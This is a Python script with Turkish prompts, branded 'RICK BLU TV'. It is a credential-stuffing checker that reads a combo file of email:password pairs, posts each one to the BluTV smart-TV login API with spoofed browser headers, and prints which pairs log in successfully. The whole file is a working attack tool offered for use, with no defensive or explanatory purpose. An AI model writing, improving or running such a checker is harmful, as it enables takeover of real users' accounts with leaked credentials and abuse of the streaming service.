import requests
import os
try:
    from cfonts import render
except:
    os.system('pip install python-cfonts')

class RickLoginChecker:
    def __init__(self):
        self.url = "https://smarttv.blutv.com.tr/actions/account/login"
        self.headers = {
            'deviceid': 'Windows:Chrome:94.0.4606.71',
            'deviceresolution': '1366x768',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.blutv.com',
            'sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
            'sec-ch-ua-mobile': "?0",
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36'
        }

    def login_check(self, email, password):
        data = f"username={email}&password={password}&platform=com.blu.smarttv"
        response = requests.post(self.url, data=data, headers=self.headers)
        
        # API yanıtını JSON formatında almak
        try:
            response_json = response.json()  # Yanıtı JSON olarak alıyoruz
        except ValueError:
            print(f"\033[1;31mYanıt JSON formatında değil ❌: {email}:{password}")
            return

        # Yanıtın 'status' ve 'user' alanlarına göre kontrol yapıyoruz
        if response_json.get("status") == "ok" and response_json.get("user", {}).get("OK"):
            print(f"\033[2;32mBaşarılı Giriş ✅: {email}:{password}")
        else:
            print(f"\033[1;31mBaşarısız Giriş ❌: {email}:{password}")

    def rick_tool_from_file(self, combo_yolu):
        with open(combo_yolu, "r") as file:
            for line in file:
                email, password = line.strip().split(":")
                self.login_check(email, password)

# Başlangıç mesajı
output = render('    RICK     BLU TV ', colors=['white', 'blue'], align='center')
print(output)

combo_yolu = input("\033[2;35mCombo Yolu: ")

checker = RickLoginChecker()
checker.rick_tool_from_file(combo_yolu)
